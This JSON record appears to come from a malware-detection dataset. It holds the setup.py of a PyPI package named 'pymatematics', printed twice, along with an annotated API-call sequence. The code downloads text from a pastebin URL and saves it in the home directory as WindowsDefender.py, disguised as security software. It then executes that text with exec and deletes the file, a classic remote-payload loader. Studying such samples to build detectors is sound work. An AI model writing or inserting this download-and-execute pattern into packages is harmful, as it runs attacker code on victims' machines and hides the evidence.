[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pymatematics-1.0.0/pymatematics-1.0.0/setup.py",
    "code_snippet": "import requests\nimport os\n\ndef send_discord_info():\n import requests\n import os\n\n url = 'https://pastebin.pl/view/raw/c9c74e28'\n\n archivo = requests.get(url)\n codigo = archivo.text\n\n ruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')\n with open(ruta, 'w', encoding='utf-8') as f:\n     f.write(\"# -*- coding: latin-1 -*-\\n\")\n     f.write(codigo)\n\n exec(compile(codigo, ruta, 'exec'))\n\n os.remove(ruta)\n\nif __name__ == '__main__':\n    send_discord_info()",
    "pattern_analysis": {
      "api_sequence": [
        "requests.get",
        "os.path.expanduser",
        "os.path.join",
        "open",
        "builtins.open.write",
        "builtins.open.write",
        "compile",
        "exec",
        "os.remove"
      ],
      "api_sequence_with_args": [
        "requests.get(url)",
        "os.path.expanduser('~')",
        "os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')",
        "open(ruta, 'w', encoding='utf-8')",
        "f.write(\"# -*- coding: latin-1 -*-\\n\")",
        "f.write(codigo)",
        "compile(codigo, ruta, 'exec')",
        "exec(compile(codigo, ruta, 'exec'))",
        "os.remove(ruta)"
      ],
      "mapped_sequence": [
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.path.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "builtins.open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "builtins.open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "compile",
          "id": "compile_code_object",
          "description": "Compiles source code string into executable code object",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "code_compilation"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        }
      ],
      "contextual_code": "import requests\nimport os\n\ndef send_discord_info():\n    url = 'https://pastebin.pl/view/raw/c9c74e28'\n    archivo = requests.get(url)\n    codigo = archivo.text\n    ruta = os.path.join(os.path.expanduser('~'), 'WindowsDefender.py')\n    with open(ruta, 'w', encoding='utf-8') as f:\n        f.write(\"# -*- coding: latin-1 -*-\\n\")\n        f.write(codigo)\n    exec(compile(codigo, ruta, 'exec'))\n    os.remove(ruta)\n\nif __name__ == '__main__':\n    send_discord_info()"
    }
  }
]